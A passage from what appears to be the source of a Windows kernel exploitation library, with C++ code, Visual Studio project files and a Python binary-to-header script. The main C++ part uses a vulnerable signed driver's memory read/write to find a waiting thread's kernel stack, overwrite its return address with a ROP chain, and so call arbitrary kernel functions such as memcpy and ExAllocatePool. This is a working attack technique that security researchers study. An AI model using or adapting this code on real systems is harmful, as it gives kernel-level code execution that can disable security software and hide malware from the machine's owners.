        m_dwKernelImageSize = 0;
    }

    m_bInitialized = FALSE;

    // unload loldriver
    return DriverUninit();
}
//--------------------------------------------------------------------------------------
static DWORD WINAPI DummyThread(LPVOID lpParam)
{
    HANDLE hEvent = lpParam;

#ifdef DBG_CALL

    DbgMsg(
        __FILE__, __LINE__,
        "Putting thread %x:%x into the waitable state...\n", GetCurrentProcessId(), GetCurrentThreadId()
    );

#endif

    WaitForSingleObject(hEvent, INFINITE);

#ifdef DBG_CALL

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): EXIT\n");

#endif

    return 0;
}

BOOL KfCallAddr(PVOID ProcAddr, PVOID *Args, DWORD dwArgsCount, PVOID *pRetVal)
{
    BOOL bRet = FALSE;    
    HANDLE hThread = NULL, hEvent = NULL;       
    PVOID RetVal = NULL;

    if (!m_bInitialized)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
        return FALSE;
    }

    if (dwArgsCount > MAX_ARGS)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Too many arguments\n");
        return FALSE;
    }       

    // create waitable event
    if ((hEvent = CreateEvent(NULL, FALSE, FALSE, NULL)) == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "CreateEvent() ERROR %d\n", GetLastError());
        goto _end;
    }

    DWORD dwThreadId = 0;

    // create dummy thread
    if ((hThread = CreateThread(NULL, 0, DummyThread, hEvent, 0, &dwThreadId)) == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "CreateThread() ERROR %d\n", GetLastError());
        goto _end;
    }

    while (true)
    {
        // determine current state of dummy thread
        DWORD State = GetThreadState(GetCurrentProcessId(), dwThreadId);
        if (State == -1)
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: GetThreadState() fails\n");
            goto _end;
        }

        if (State == Waiting)
        {
            // thread was entered into the wait state
            break;
        }

        SwitchToThread();
    }

    // get _KTHREAD address by handle
    PVOID pThread = GetObjectAddress(hThread);
    if (pThread == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: GetObjectAddress() fails\n");
        goto _end;
    }

#ifdef DBG_CALL

    DbgMsg(__FILE__, __LINE__, "_KTHREAD is at "IFMT"\n", pThread);

#endif

    PUCHAR StackBase = NULL, KernelStack = NULL;
    
    // get stack base of the thread
    if (!MemReadPtr(RVATOVA(pThread, KTHREAD_StackBase), (PVOID *)&StackBase))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverMemReadPtr() fails\n");
        goto _end;
    }

    // get stack pointer of the thread
    if (!MemReadPtr(RVATOVA(pThread, KTHREAD_KernelStack), (PVOID *)&KernelStack))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverMemReadPtr() fails\n");
        goto _end;
    }

#ifdef DBG_CALL

    DbgMsg(__FILE__, __LINE__, "Thread kernel stack base is at "IFMT"\n", StackBase);
    DbgMsg(__FILE__, __LINE__, "Thread kernel stack pointer is at "IFMT"\n", KernelStack);

#endif

    PVOID RetAddr = NULL;
    PUCHAR Ptr = StackBase - sizeof(PVOID);    

    // walk over the kernel stack
    while (Ptr > KernelStack)
    {
        DWORD_PTR Val = 0;

        // read stack value
        if (!MemReadPtr(Ptr, (PVOID *)&Val))
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverMemReadPtr() fails\n");
            goto _end;
        }

        /* 
            Check for the return address from system call handler back to
            the nt!KiSystemServiceCopyEnd(), it's located at the bottom
            of the kernel stack.
        */
        if (Val > m_KernelAddr &&
            Val < m_KernelAddr + m_dwKernelSize)
        {
            RetAddr = Ptr;
            break;
        }

        // go to the next stack location
        Ptr -= sizeof(PVOID);
    }

    if (RetAddr == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to locate return address\n");
        goto _end;
    }

#ifdef DBG_CALL

    DbgMsg(__FILE__, __LINE__, "Return address was found at "IFMT"\n", RetAddr);

#endif

    #define STACK_PUT(_offset_, _val_)                                                          \
                                                                                                \
        if (!MemWritePtr(RVATOVA(RetAddr, (_offset_)), (PVOID)(_val_)))                         \
        {                                                                                       \
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverMemWritePtr() fails\n");    \
            goto _end;                                                                          \
        }

    // hijack the return address with forged function call
    STACK_PUT(0x00, m_RopAddr_1);

    // save an address for the forged function call
    STACK_PUT(0x08 + 0x20, ProcAddr);

    if (dwArgsCount > 0)
    {
        // 1-st argument goes in RCX
        STACK_PUT(0x08 + 0x28, Args[0]);
    }

    if (dwArgsCount > 1)
    {
        // 2-nd argument goes in RDX
        STACK_PUT(0x08 + 0x30, Args[1]);
    }
    
    if (dwArgsCount > 2)
    {
        // 3-rd argument goes in R8
        STACK_PUT(0x08 + 0x38, Args[2]);
    }

    if (dwArgsCount > 3)
    {
        // 4-th argument goes in R9
        STACK_PUT(0x08 + 0x40, Args[3]);
    }

    // reserve shadow space and 9 stack arguments
    STACK_PUT(0x50, m_RopAddr_2);

    for (DWORD i = 4; i < dwArgsCount; i += 1)
    {
        // the rest arguments goes over the stack right after the shadow space
        STACK_PUT(0x58 + 0x20 + ((i - 4) * sizeof(PVOID)), Args[i]);
    }    

    // obtain RetVal address
    STACK_PUT(0xc0, m_RopAddr_3);
    STACK_PUT(0xc8, &RetVal);

    // save return value of the forged function call
    STACK_PUT(0xd0, m_RopAddr_4);

    // dummy gadget for stack alignment
    STACK_PUT(0xd8, m_RopAddr_5);

    // put the next function call
    STACK_PUT(0xe0, m_RopAddr_1);

    // forge nt!ZwTerminateThread() function call
    STACK_PUT(0xe8 + 0x20, m_ZwTerminateThread);
    STACK_PUT(0xe8 + 0x28, hThread);
    STACK_PUT(0xe8 + 0x30, THREAD_EXIT_CODE);

    SwitchToThread();

_end:

    if (hEvent && hThread)
    {
        DWORD dwExitCode = 0;

        // put thread into the ready state
        SetEvent(hEvent);
        WaitForSingleObject(hThread, INFINITE);
        
        GetExitCodeThread(hThread, &dwExitCode);

        // check for the magic exit code set by forged call
        if (dwExitCode == THREAD_EXIT_CODE)
        {
            if (pRetVal)
            {
                // return value of the function
                *pRetVal = RetVal;
            }

            bRet = TRUE;
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Something went wrong\n");
        }
    }

    if (hEvent)
    {
        CloseHandle(hEvent);
    }

    if (hThread)
    {
        CloseHandle(hThread);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
BOOL KfCall(char *lpszProcName, PVOID *Args, DWORD dwArgsCount, PVOID *pRetVal)
{
    PVOID FuncAddr = NULL;

    // obtain target exported function address by its name
    if ((FuncAddr = KfGetKernelProcAddress(lpszProcName)) == NULL)
    {
        if (!strncmp(lpszProcName, "Zw", 2))
        {
            // try to obtain not exported Zw function address
            FuncAddr = KfGetKernelZwProcAddress(lpszProcName);
        }
    }

    if (FuncAddr == NULL)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to find %s() address\n", lpszProcName);
        return FALSE;
    }

    DbgMsg(__FILE__, __LINE__, "nt!%s() is at "IFMT"\n", lpszProcName, FuncAddr);

    // perform the call
    return KfCallAddr(FuncAddr, Args, dwArgsCount, pRetVal);
}
//--------------------------------------------------------------------------------------
PVOID KfMemCopy(PVOID Dst, PVOID Src, SIZE_T Size)
{
    PVOID Ret = NULL;
    PVOID Args[] = { KF_ARG(Dst), KF_ARG(Src), KF_ARG(Size) };

    // perform memory copy operation
    if (KfCall("memcpy", Args, 3, &Ret))
    {
        return Ret;
    }

    return NULL;
}
//--------------------------------------------------------------------------------------
PVOID KfMemSet(PVOID Dst, int Val, SIZE_T Size)
{
    PVOID Ret = NULL;
    PVOID Args[] = { KF_ARG(Dst), KF_ARG(Val), KF_ARG(Size) };

    // perform memory fill operation
    if (KfCall("memset", Args, 3, &Ret))
    {
        return Ret;
    }

    return NULL;
}
//--------------------------------------------------------------------------------------
PVOID KfHeapAllocData(SIZE_T Size, PVOID Data)
{
    PVOID Ret = NULL;
    PVOID Args[] = { KF_ARG(NonPagedPool), KF_ARG(Size) };

    // allocate non paged kernel pool memory
    if (KfCall("ExAllocatePool", Args, 2, &Ret))
    {
        if (Data)
        {
            // copy the data into the allocated memory
            return KfMemCopy(Ret, Data, Size);
        }

        return Ret;
    }

    return NULL;
}

PVOID KfHeapAlloc(SIZE_T Size)
{
    return KfHeapAllocData(Size, NULL);
}
//--------------------------------------------------------------------------------------
void KfHeapFree(PVOID Addr)
{
    PVOID Args[] = { KF_ARG(Addr) };

    // free kernel pool memory
    KfCall("ExFreePool", Args, 1, NULL);
}
//--------------------------------------------------------------------------------------
// EoF

```

`kforge_library/kforge_library.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="..\common\common.cpp" />
    <ClCompile Include="..\common\debug.cpp" />
    <ClCompile Include="..\common\peimage.cpp" />
    <ClCompile Include="kforge_library.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\common\common.h" />
    <ClInclude Include="..\common\debug.h" />
    <ClInclude Include="..\common\ntdll_defs.h" />
    <ClInclude Include="..\common\ntdll_undocnt.h" />
    <ClInclude Include="..\common\peimage.h" />
    <ClInclude Include="..\include\kforge_driver.h" />
    <ClInclude Include="..\include\kforge_library.h" />
    <ClInclude Include="stdafx.h" />
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{01DA4344-6C0C-4692-9542-D2E895AA4AFB}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>kforge_library</RootNamespace>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v120</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v120</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>WIN32;_DEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
      <AdditionalIncludeDirectories>$(SolutionDir);$(ProjectDir)</AdditionalIncludeDirectories>
      <AdditionalOptions>/D DBG %(AdditionalOptions)</AdditionalOptions>
      <BasicRuntimeChecks>EnableFastChecks</BasicRuntimeChecks>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
    <Lib>
      <OutputFile>$(SolutionDir)$(TargetName)$(TargetExt)</OutputFile>
    </Lib>
    <PreBuildEvent>
      <Command>
      </Command>
    </PreBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>WIN32;NDEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <AdditionalIncludeDirectories>$(SolutionDir);$(ProjectDir)</AdditionalIncludeDirectories>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <AdditionalOptions>/D DBG %(AdditionalOptions)</AdditionalOptions>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
    </Link>
    <Lib>
      <OutputFile>$(SolutionDir)$(TargetName)$(TargetExt)</OutputFile>
    </Lib>
    <PreBuildEvent>
      <Command>
      </Command>
    </PreBuildEvent>
  </ItemDefinitionGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`kforge_library/kforge_library.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Header Files\common">
      <UniqueIdentifier>{d4d8c19d-1de9-45ef-8245-96b4b2e4d1a7}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\common">
      <UniqueIdentifier>{ae12cdf3-788b-4a0a-87e7-8e9807718eb5}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="kforge_library.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="..\common\common.cpp">
      <Filter>Source Files\common</Filter>
    </ClCompile>
    <ClCompile Include="..\common\debug.cpp">
      <Filter>Source Files\common</Filter>
    </ClCompile>
    <ClCompile Include="..\common\peimage.cpp">
      <Filter>Source Files\common</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\common\common.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\common\debug.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\common\ntdll_defs.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\common\ntdll_undocnt.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
    <ClInclude Include="..\include\kforge_driver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\include\kforge_library.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\common\peimage.h">
      <Filter>Header Files\common</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`kforge_library/stdafx.h`:

```h
#pragma warning(disable: 4996)

#include <stdio.h>

#include <Windows.h>
#include <sddl.h>

#include "common/ntdll_defs.h"
#include "common/ntdll_undocnt.h"
#include "common/common.h"
#include "common/debug.h"
#include "common/peimage.h"

#include "include/kforge_driver.h"
#include "include/kforge_library.h"

```

`tools/make_header.py`:

```py
#!/usr/bin/env python

import sys, os
from optparse import OptionParser

LINE_WIDTH = 16

def main():

    parser = OptionParser()

    parser.add_option("-i", "--input-path", dest = "input", default = None,
        help = "input binary path")

    parser.add_option("-o", "--output-path", dest = "output", default = None,
        help = "output C header path")

    parser.add_option("-n", "--name", dest = "name", default = None,
        help = "variable name")

    options, _ = parser.parse_args()

    if options.input is None or options.output is None or options.name is None:

        print('USAGE: trustlet_prepare.py -i <input_file> -o <output_file> -n <var_name>')
        return -1

    print('[+] Loading input file "%s"' % options.input)

    with open(options.input, 'rb') as fd:

        # read binary contents
        data = fd.read()

    header = '// %d bytes readed from %s\n' % (len(data), os.path.basename(options.input))
    header += 'unsigned char %s[] = \n{\n' % options.name
    lines = []

    while len(data) > 0:

        lines.append(', '.join(map(lambda b: '0x%.2x' % ord(b), data[: LINE_WIDTH])))
        data = data[LINE_WIDTH :]

    header += ',\n'.join(lines)
    header += '\n};\n'

    print('[+] Saving output file "%s"' % options.output)

    with open(options.output, 'wb') as fd:

        # write C header contents
        fd.write(header)

    return 0

if __name__ == '__main__':

    exit(main())

#
# EoF
#
```